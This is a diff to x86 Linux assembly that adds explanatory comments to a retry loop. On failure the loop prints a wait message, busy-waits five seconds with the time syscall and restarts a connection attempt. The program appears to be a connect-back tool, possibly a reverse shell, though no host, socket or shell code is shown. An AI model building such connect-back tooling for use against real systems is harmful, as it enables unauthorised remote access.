@@ -66,34 +66,38 @@ _start:
 	; If execve != 0 then wait 5 secs
 	cmp eax, 0
 	jne wait_sec
-	jmp connected
+	jmp connected ; If connected then continue
 
 wait_sec:
+	; Print wait line
 	mov eax, 4
 	mov ebx, 1
 	mov ecx, wait_str
 	mov edx, wait_str_len
-	int 0x80
+	int 0x80 ; write(1, "Wait blabla", size);
 
 	mov eax, 0x0D
 	push byte 0x00
 	mov ebx, esp
 	xor ecx, ecx
 	xor edx, edx
-	int 0x80
+	int 0x80 ;  time(0)
 
-	mov esi, eax
-	add esi, 5
+	mov esi, eax 
+	add esi, 5 ; esi = (time(0) + 5 secs)
+
+; While time(0) < (time(0) + 5 secs)
 L2:
 	mov eax, 0x0D
 	mov ebx, esp
 	xor ecx, ecx
 	xor edx, edx
-	int 0x80
+	int 0x80; time(0)
 
 	cmp eax, esi
 	jl L2
 
+	; Restart connection attempt
 	jmp _start
 
 connected:
